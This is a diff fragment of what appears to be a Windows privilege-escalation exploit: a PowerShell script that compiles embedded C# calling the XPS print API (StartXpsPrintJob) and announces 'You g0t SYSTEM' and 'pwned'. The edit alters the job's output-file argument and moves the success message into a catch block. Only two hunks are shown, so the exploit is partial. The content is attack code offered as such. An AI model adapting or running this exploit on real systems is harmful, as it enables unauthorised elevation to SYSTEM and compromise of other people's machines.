@@ -35,8 +35,7 @@ CloseHandle(completionEvent);
 }
 private static void StartJob(string printerName, string jobName, IntPtr completionEvent, out IXpsPrintJob job, out IXpsPrintJobStream jobStream)
 {
-int result = StartXpsPrintJob(printerName, jobName,
-"c:\\windows\\temp\\test.txt", IntPtr.Zero, completionEvent,
+int result = StartXpsPrintJob(printerName, jobName, null, IntPtr.Zero, completionEvent,
 null, 0, out job, out jobStream, IntPtr.Zero);
 
 }
@@ -103,11 +102,8 @@ WAIT_FAILED = -1
 
 "@
 add-type -typeDefinition $mycode
-[XPS.XpsPrint]::StartPrintJob()
-#try { [XPS.XpsPrint]::StartPrintJob() }
-#catch { "!" }
-echo "[+] You g0t SYSTEM !!!"
+try { [XPS.XpsPrint]::StartPrintJob() }
+catch { "[+] You g0t SYSTEM !!!" }
 echo "[+] pwned !"
 echo ""
 exit
-
